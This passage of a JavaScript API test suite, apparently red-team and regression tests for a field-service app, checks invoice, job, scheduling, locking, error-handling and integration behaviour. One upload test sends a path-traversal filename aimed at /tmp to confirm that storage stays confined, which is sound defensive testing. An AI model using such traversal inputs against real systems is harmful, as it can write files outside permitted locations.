  const file = path.join(STORAGE, ...photo.key.split('/'));
  assert.ok(fs.existsSync(file), 'precondition: stored file exists');
  const del = await api('DELETE', `/api/jobs/${j.id}`, { token: U.admin.token });
  assert.equal(del.status, 200, del.text);
  assert.equal(fs.existsSync(file), false, `orphaned file left in storage: ${photo.key}`);
});

test('[regression] upload filename path traversal stays inside the storage root', async () => {
  const c = await mkCustomer();
  const j = await mkJob(c.id);
  const png = Buffer.from('89504e470d0a1a0a', 'hex');
  const mp = multipart('photo', '../../../../../tmp/rt-escape.png', 'image/png', png);
  const r = await api('POST', `/api/jobs/${j.id}/photos`, { token: U.admin.token, body: mp.body, headers: mp.headers });
  if (r.status !== 201) return; // rejecting is fine too
  const photo = await prisma.jobPhoto.findUnique({ where: { id: r.json.id } });
  assert.ok(!photo.key.includes('..'), photo.key);
  assert.ok(fs.existsSync(path.join(STORAGE, ...photo.key.split('/'))));
});

// ═════════════════════════════════════════════════════════════════════════════
// Data integrity — billing, jobs, schedule, locking
// ═════════════════════════════════════════════════════════════════════════════

test('RT-11a a $0 invoice is rejected (the "Create Invoice" button posts amount:0)', async () => {
  const c = await mkCustomer();
  const j = await mkJob(c.id);
  const r = await api('POST', '/api/invoices', { token: U.admin.token, body: { jobId: j.id, amount: 0 } });
  if (r.json && r.json.id) created.invoices.push(r.json.id);
  assert.equal(r.status, 400, `$0 invoice created (HTTP ${r.status})`);
});

test('RT-11b negative quote / invoice amounts are rejected', async () => {
  const c = await mkCustomer();
  const j = await mkJob(c.id);
  const q = await api('POST', '/api/quotes', { token: U.admin.token, body: { jobId: j.id, amount: -250 } });
  if (q.json && q.json.id) created.quotes.push(q.json.id);
  assert.equal(q.status, 400, `negative quote created (HTTP ${q.status})`);
  const inv = await prisma.invoice.create({ data: { jobId: j.id, amount: 100 } });
  created.invoices.push(inv.id);
  const p = await api('PATCH', `/api/invoices/${inv.id}`, { token: U.admin.token, body: { amount: '-1' } });
  const now = await prisma.invoice.findUnique({ where: { id: inv.id } });
  assert.equal(now.amount, 100, `invoice amount patched to ${now.amount} (HTTP ${p.status})`);
});

test('RT-11c non-numeric amount is a 400, not a 500', async () => {
  const c = await mkCustomer();
  const j = await mkJob(c.id);
  const r = await api('POST', '/api/invoices', { token: U.admin.token, body: { jobId: j.id, amount: 'abc' } });
  assert.equal(r.status, 400, `HTTP ${r.status}`);
});

test('RT-11d invoice status is restricted to unpaid|paid|overdue|void', async () => {
  const c = await mkCustomer();
  const j = await mkJob(c.id);
  const inv = await prisma.invoice.create({ data: { jobId: j.id, amount: 100 } });
  created.invoices.push(inv.id);
  const r = await api('PATCH', `/api/invoices/${inv.id}`, { token: U.admin.token, body: { status: 'banana' } });
  assert.equal(r.status, 400, `status "banana" accepted (HTTP ${r.status})`);
});

test('RT-12a job status is restricted to pending|scheduled|in-progress|completed|cancelled', async () => {
  const c = await mkCustomer();
  const j = await mkJob(c.id);
  const r = await api('PATCH', `/api/jobs/${j.id}`, { token: U.dispatcher.token, body: { status: 'banana' } });
  assert.equal(r.status, 400, `status "banana" accepted (HTTP ${r.status})`);
});

test('RT-12b reopening a completed job clears completedAt', async () => {
  const c = await mkCustomer();
  const j = await mkJob(c.id);
  await api('PATCH', `/api/jobs/${j.id}`, { token: U.dispatcher.token, body: { status: 'completed' } });
  await api('PATCH', `/api/jobs/${j.id}`, { token: U.dispatcher.token, body: { status: 'scheduled' } });
  const now = await prisma.job.findUnique({ where: { id: j.id } });
  assert.equal(now.completedAt, null, 'job is "scheduled" but still has completedAt');
});

test('RT-13 a technician cannot be double-booked into overlapping slots', async () => {
  const c = await mkCustomer();
  const slot = { customerId: c.id, technicianId: U.tech2.id, scheduledDate: '2031-01-15', scheduledTime: '09:00', duration: 2 };
  const a = await api('POST', '/api/jobs', { token: U.dispatcher.token, body: { title: `RT A ${RUN}`, ...slot } });
  if (a.json && a.json.id) created.jobs.push(a.json.id);
  assert.equal(a.status, 201, a.text);
  const b = await api('POST', '/api/jobs', { token: U.dispatcher.token, body: { title: `RT B ${RUN}`, ...slot, scheduledTime: '10:00' } });
  if (b.json && b.json.id) created.jobs.push(b.json.id);
  assert.equal(b.status, 409, `overlapping job accepted (HTTP ${b.status})`);
});

test('RT-9 optimistic locking is atomic: of N concurrent writers with the same version, exactly one wins', async () => {
  const c = await mkCustomer();
  const N = 8;
  const results = await Promise.all(Array.from({ length: N }, (_, i) =>
    api('PATCH', `/api/customers/${c.id}`, { token: U.admin.token, body: { notes: `writer ${i}`, version: 1 } })));
  const wins = results.filter((r) => r.status === 200).length;
  const conflicts = results.filter((r) => r.status === 409).length;
  assert.equal(wins, 1, `${wins} writers with version=1 all succeeded (lost updates); ${conflicts} got 409`);
});

test('[regression] stale version gets 409 (sequential)', async () => {
  const c = await mkCustomer();
  assert.equal((await api('PATCH', `/api/customers/${c.id}`, { token: U.admin.token, body: { notes: 'a', version: 1 } })).status, 200);
  assert.equal((await api('PATCH', `/api/customers/${c.id}`, { token: U.admin.token, body: { notes: 'b', version: 1 } })).status, 409);
});

// ═════════════════════════════════════════════════════════════════════════════
// Error handling — client errors must be 4xx, not 500 with Prisma internals
// ═════════════════════════════════════════════════════════════════════════════

test('RT-17a duplicate invoice for a job is 409, not 500', async () => {
  const c = await mkCustomer();
  const j = await mkJob(c.id);
  const inv = await prisma.invoice.create({ data: { jobId: j.id, amount: 100 } });
  created.invoices.push(inv.id);
  const r = await api('POST', '/api/invoices', { token: U.admin.token, body: { jobId: j.id, amount: 50 } });
  assert.equal(r.status, 409, `HTTP ${r.status}: ${r.text.slice(0, 100)}`);
});

test('RT-17b deleting a job that has an invoice is 409, not 500', async () => {
  const c = await mkCustomer();
  const j = await mkJob(c.id);
  const inv = await prisma.invoice.create({ data: { jobId: j.id, amount: 100 } });
  created.invoices.push(inv.id);
  const r = await api('DELETE', `/api/jobs/${j.id}`, { token: U.admin.token });
  assert.equal(r.status, 409, `HTTP ${r.status}: ${r.text.slice(0, 100)}`);
});

test('RT-17c non-numeric / unknown ids give 400/404, never 500 with internals', async () => {
  const bad = [];
  for (const [m, p, body] of [
    ['GET', '/api/users/me'], ['GET', '/api/customers/abc'], ['GET', '/api/jobs/abc'],
    ['DELETE', '/api/communications/999999999'], ['POST', '/api/jobs', { title: 'x', customerId: 999999999 }],
  ]) {
    const r = await api(m, p, { token: U.sa.token, body });
    if (r.status >= 500 || /prisma|invocation|\.js:\d+/i.test(r.text)) bad.push(`${m} ${p} → ${r.status}`);
  }
  assert.deepEqual(bad, []);
});

// ═════════════════════════════════════════════════════════════════════════════
// Integrations with placeholder credentials
// ═════════════════════════════════════════════════════════════════════════════

test('RT-26 unauthenticated Gmail webhook does not report success', async () => {
  const r = await api('POST', '/api/communications/gmail/webhook', { body: { message: { data: 'e30=' } } });
  assert.notEqual(r.status, 200, 'unauthenticated webhook answered 200 {received:true}');
});

test('[regression] QuickBooks / SMS / Google are inert in sandbox (no outbound call)', async () => {
  assert.equal((await api('GET', '/api/quickbooks/callback?code=x&state=y&realmId=1')).status, 503);
  assert.equal((await api('GET', '/api/auth/google/callback?code=x')).status, 503);
  const s = await api('POST', '/api/sms/send', { token: U.admin.token, body: { to: '+15555550100', body: 'sandbox' } });
  assert.equal(s.json && s.json.sent, false);
});
